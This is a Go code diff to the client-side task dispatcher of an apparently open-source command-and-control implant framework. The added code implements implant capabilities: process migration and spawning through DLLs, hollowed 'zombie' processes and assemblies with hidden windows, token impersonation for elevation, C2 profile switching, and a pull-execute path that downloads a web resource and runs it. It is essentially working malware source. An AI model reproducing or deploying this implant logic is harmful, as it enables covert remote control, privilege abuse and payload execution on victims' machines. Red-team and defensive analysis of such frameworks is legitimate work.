@@ -1,6 +1,7 @@
 package c2
 
 import (
+	"context"
 	"io/fs"
 	"os"
 	"syscall"
@@ -8,14 +9,21 @@ import (
 
 	"github.com/iDigitalFlame/xmt/c2/cout"
 	"github.com/iDigitalFlame/xmt/c2/task"
+	"github.com/iDigitalFlame/xmt/cmd"
+	"github.com/iDigitalFlame/xmt/cmd/filter"
 	"github.com/iDigitalFlame/xmt/com"
 	"github.com/iDigitalFlame/xmt/data"
 	"github.com/iDigitalFlame/xmt/device"
+	"github.com/iDigitalFlame/xmt/device/local"
+	"github.com/iDigitalFlame/xmt/util/bugtrack"
+	"github.com/iDigitalFlame/xmt/util/xerr"
 )
 
 const ret404Tasks = false
 
-// DefaultClientMux is the default Session Mux instance that handles the default C2 server and client functions.
+// DefaultClientMux is the default Session Mux instance that handles the default
+// C2 server and client functions.
+//
 // This operates cleanly with the default Server Mux instance.
 var DefaultClientMux = MuxFunc(defaultClientMux)
 
@@ -24,23 +32,35 @@ type Mux interface {
 	Handle(*Session, *com.Packet) bool
 }
 
-// MuxFunc is the definition of a Mux Handler func. Once wrapped as a 'MuxFunc', these function aliases can be also
-// used in place of the Mux interface.
+// MuxFunc is the definition of a Mux Handler function.
+//
+// Once wrapped as a 'MuxFunc', these function aliases can be also used in place
+// of the Mux interface.
 type MuxFunc func(*Session, *com.Packet) bool
 
 func defaultClientMux(s *Session, n *com.Packet) bool {
-	if n.ID < task.MvTime {
+	if n.ID < task.MvRefresh {
 		return false
 	}
 	if cout.Enabled {
 		s.log.Info("[%s/MuX] Received packet %q.", s.ID, n)
 	}
 	if n.ID < RvResult {
+		if n.ID == task.MvSpawn {
+			go executeTask(s.handleSpawn, s, n)
+			return true
+		}
 		var (
 			r      = &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID}
 			v, err = internalTask(s, n, r)
 		)
 		if v {
+			if err == nil && n.ID == task.MvMigrate {
+				if cout.Enabled {
+					s.log.Info("[%s/Mux] Migrate Job %d returned true, not sending response back!", s.ID, n.Job)
+				}
+				return true
+			}
 			if err != nil {
 				if r.Clear(); cout.Enabled {
 					s.log.Error("[%s/MuX] Error during Job %d runtime: %s!", s.ID, n.Job, err)
@@ -51,6 +71,7 @@ func defaultClientMux(s *Session, n *com.Packet) bool {
 			s.queue(r)
 			return true
 		}
+		r.Clear()
 		r = nil
 	}
 	t := task.Mappings[n.ID]
@@ -69,12 +90,18 @@ func defaultClientMux(s *Session, n *com.Packet) bool {
 	return true
 }
 
-// Handle satisfies the Mux interface requirement and will process the received Packet. This function allows
-// Wrapped MuxFunc objects to be used directly in place of more complex Mux definitions.
+// Handle satisfies the Mux interface requirement and will process the received
+// Packet.
+//
+// This function allows Wrapped MuxFunc objects to be used directly in place of
+// more complex Mux definitions.
 func (m MuxFunc) Handle(s *Session, n *com.Packet) bool {
 	return m(s, n)
 }
 func executeTask(t task.Tasker, s *Session, n *com.Packet) {
+	if bugtrack.Enabled {
+		defer bugtrack.Recover("c2.executeTask()")
+	}
 	if cout.Enabled {
 		s.log.Info("[%s/TasK] Starting Task with JobID %d.", s.ID, n.Job)
 	}
@@ -92,7 +119,7 @@ func executeTask(t task.Tasker, s *Session, n *com.Packet) {
 		s.log.Debug("[%s/TasK] Task with JobID %d completed!", s.ID, n.Job)
 	}
 	if err = s.write(false, r); err != nil {
-		if cout.Enabled {
+		if r.Clear(); cout.Enabled {
 			s.log.Error("[%s/TasK] Received error sending Task results: %s!", s.ID, err)
 		}
 	}
@@ -138,7 +165,7 @@ func internalTask(s *Session, n *com.Packet, w data.Writer) (bool, error) {
 			return true, nil
 		}
 		var l []fs.DirEntry
-		if l, err = os.ReadDir(d); err != nil && len(l) == 0 {
+		if l, err = os.ReadDir(d); err != nil {
 			return true, err
 		}
 		w.WriteUint32(uint32(len(l)))
@@ -171,33 +198,188 @@ func internalTask(s *Session, n *com.Packet, w data.Writer) (bool, error) {
 			s.sleep = time.Duration(d)
 		}
 		return true, nil
-	case task.MvSpawn:
-		// TODO: Handle spawn code here.
-		return true, nil
 	case task.MvProxy:
-		// TODO: Handle proxy code here.
+		// TODO(dij): Handle proxy code here.
 		return true, nil
-	case task.MvElevate:
-		return true, nil
-	case task.MvRefresh:
-		if err := device.Local.Refresh(); err != nil {
+	case task.MvMounts:
+		m, err := device.Mounts()
+		if err != nil {
 			return true, err
 		}
-		return true, device.Local.MarshalStream(w)
+		data.WriteStringList(w, m)
+		return true, nil
+	case task.MvMigrate:
+		var (
+			k bool
+			i string
+			p []byte
+		)
+		if err := n.ReadBool(&k); err != nil {
+			return true, err
+		}
+		if err := n.ReadString(&i); err != nil {
+			return true, err
+		}
+		if err := n.ReadBytes(&p); err != nil {
+			return true, err
+		}
+		e, v, err := readCallable(s.ctx, n)
+		if err != nil {
+			return true, err
+		}
+		if _, err = s.MigrateProfile(k, i, p, n.Job, 0, e); err != nil {
+			if len(v) > 0 {
+				os.Remove(v)
+			}
+			return true, err
+		}
+		return true, nil
+	case task.MvElevate:
+		var f filter.Filter
+		if err := f.UnmarshalStream(n); err != nil {
+			return true, err
+		}
+		if f.Empty() {
+			f = filter.Filter{Elevated: filter.True}
+		}
+		return true, device.Impersonate(&f)
+	case task.MvRevSelf:
+		return true, device.RevertToSelf()
+	case task.MvRefresh:
+		if cout.Enabled {
+			s.log.Debug("[%s] Triggering a device refresh.", s.ID)
+		}
+		if err := local.Device.Refresh(); err != nil {
+			return true, err
+		}
+		s.Device = *local.Device.Machine
+		s.Device.MarshalStream(w)
+		return true, nil
+	case task.MvProfile:
+		if ProfileParser == nil {
+			return true, xerr.Sub("no Profile parser loaded", 0x8)
+		}
+		b, err := n.Bytes()
+		if err != nil {
+			return true, err
+		}
+		p, err := ProfileParser(b)
+		if err != nil {
+			return true, xerr.Wrap("parse Profile", err)
+		}
+		if cout.Enabled {
+			s.log.Info("[%s] Setting new profile, switch will happen on next connect cycle.", s.ID)
+		}
+		s.swap = p
+		return true, nil
 	}
 	return false, nil
 }
-
-// stream will act as a data.Writer
-//  will allow for writes up until X, then will
-//  send packet using the 'queue' or 'send' functions of the 's' Session.
-//
-// Unset data will be sent on a close call or flush.
-//
-//  Flag Count will be incremented before send, so
-//   first packet will be Current: 1, Max: 2
-//   so we can keep scaling the window.
-//   A close call with an empty flag will NOT frag.
-//   A close call with no extra data will close the frag by sending an
-//    additional frag setting the max.
-//
+func readCallable(x context.Context, r data.Reader) (cmd.Runnable, string, error) {
+	var (
+		f   *filter.Filter
+		err = f.UnmarshalStream(r)
+	)
+	if err != nil {
+		return nil, "", err
+	}
+	var (
+		e cmd.Runnable
+		j bool
+		v string
+		t uint8
+	)
+	if err = r.ReadUint8(&t); err != nil {
+		return nil, "", err
+	}
+	// NOTE(dij): We're using the Background context here as we don't want
+	//            cancelation for this process as we're creating it to
+	//            succeed us (or be independent).
+	switch t {
+	case task.TvDLL:
+		var d *cmd.DLL
+		if d, _, j, err = task.DLLUnmarshal(context.Background(), r); err != nil {
+			return nil, "", err
+		}
+		if d.Timeout = 0; j {
+			v = d.Path
+		}
+		e = d
+	case task.TvZombie:
+		var z *cmd.Zombie
+		if z, _, j, err = task.ZombieUnmarshal(context.Background(), r); err != nil {
+			return nil, "", err
+		}
+		if z.Timeout = 0; j {
+			v = z.Path
+		}
+		// NOTE(dij): I'm assuming these would be /wanted/ yes?
+		z.SetNoWindow(true)
+		z.SetWindowDisplay(0)
+		e = z
+	case task.TvExecute:
+		var p *cmd.Process
+		if p, _, err = task.ProcessUnmarshal(context.Background(), r); err != nil {
+			return nil, "", err
+		}
+		p.Timeout = 0
+		// NOTE(dij): I'm assuming these would be /wanted/ yes?
+		p.SetNoWindow(true)
+		p.SetWindowDisplay(0)
+		e = p
+	case task.TvAssembly:
+		var a *cmd.Assembly
+		if a, _, err = task.AssemblyUnmarshal(context.Background(), r); err != nil {
+			return nil, "", err
+		}
+		a.Timeout = 0
+		e = a
+	case task.TvPullExecute:
+		if v, err = r.StringVal(); err != nil {
+			return nil, "", err
+		}
+		// NOTE(dij): We HAVE to set the Context as the parent to avoid
+		//            io locking issues. *shrug* Luckily, the 'Release' function
+		//            does it job!
+		if e, v, err = task.WebResource(x, nil, false, v); err != nil {
+			return nil, "", err
+		}
+	default:
+		if v, err = os.Executable(); err != nil {
+			return nil, "", err
+		}
+		c := cmd.NewProcessContext(context.Background(), v)
+		c.SetNoWindow(true)
+		c.SetWindowDisplay(0)
+		e = c
+	}
+	if e.SetParent(f); !j {
+		v = ""
+	}
+	return e, v, nil
+}
+func (s *Session) handleSpawn(x context.Context, r data.Reader, w data.Writer) error {
+	var (
+		i string
+		p []byte
+	)
+	if err := r.ReadString(&i); err != nil {
+		return err
+	}
+	if err := r.ReadBytes(&p); err != nil {
+		return err
+	}
+	e, v, err := readCallable(s.ctx, r)
+	if err != nil {
+		return err
+	}
+	var c uint32
+	if c, err = s.SpawnProfile(i, p, 0, e); err != nil {
+		if len(v) > 0 {
+			os.Remove(v)
+		}
+		return err
+	}
+	w.WriteUint32(c)
+	return nil
+}
